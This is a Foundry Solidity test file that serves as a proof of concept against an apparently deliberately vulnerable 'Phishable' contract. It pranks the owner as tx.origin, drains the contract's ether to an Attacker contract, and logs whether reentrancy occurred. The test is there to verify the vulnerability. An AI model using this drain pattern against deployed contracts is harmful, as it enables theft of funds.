// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/phishable.sol";

contract ReentrancyTest is Test {
    Phishable phishable;
    Attacker attacker;
    address owner = makeAddr("owner");
    
    function setUp() public {
        // Deploy contracts
        vm.prank(owner);
        phishable = new Phishable(owner);
        
        attacker = new Attacker();
        
        // Fund the vulnerable contract
        vm.deal(address(phishable), 1 ether);
    }

    function testReentrancyVulnerability() public {
        // BEFORE-TRIGGER STATE
        console2.log("--- BEFORE-TRIGGER state ---");
        uint contractBalanceBefore = address(phishable).balance;
        uint attackerBalanceBefore = address(attacker).balance;
        console2.log("Phishable contract balance: %d wei", contractBalanceBefore);
        console2.log("Attacker contract balance: %d wei", attackerBalanceBefore);
        
        console2.log("--- TRIGGER execute reentrancy ---");
        // Record logs to detect reentrancy
        vm.recordLogs();
        
        // Use double-address prank to set both msg.sender and tx.origin to owner
        vm.prank(owner, owner);
        phishable.withdrawAll(address(attacker));
        
        console2.log("--- AFTER-TRIGGER state ---");
        // AFTER-TRIGGER STATE
        uint contractBalanceAfter = address(phishable).balance;
        uint attackerBalanceAfter = address(attacker).balance;
        console2.log("Phishable contract balance: %d wei", contractBalanceAfter);
        console2.log("Attacker contract balance: %d wei", attackerBalanceAfter);
        
        console2.log("--- VERDICT: Validate reentrancy and state changes ---");
        // Validate contract state after withdrawal
        bool balanceCondition1 = contractBalanceAfter == 0;
        bool balanceCondition2 = attackerBalanceAfter == 1 ether;
        console2.log("Phishable drained (0 balance)?", balanceCondition1);
        console2.log("Attacker received 1 ether?", balanceCondition2);
        
        // Validate reentrancy occurred
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 reenteredSig = keccak256("Reentered()");
        bool foundReentrancy = false;
        
        for (uint i; i < entries.length; i++) {
            if (entries[i].topics[0] == reenteredSig) {
                foundReentrancy = true;
                break;
            }
        }
        console2.log("Reentered event detected?", foundReentrancy);
        
        // Final vulnerability determination
        bool vulnerabilityExists = 
            balanceCondition1 && 
            balanceCondition2 && 
            foundReentrancy;
        
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Successful reentrancy attack");
        } else {
            console2.log("Vulnerability not Exist: Attack did not meet all conditions");
        }
    }
}

contract Attacker {
    event Reentered();
    
    receive() external payable {
        // Minimal operation to demonstrate reentrancy within 2300 gas
        emit Reentered();
    }
}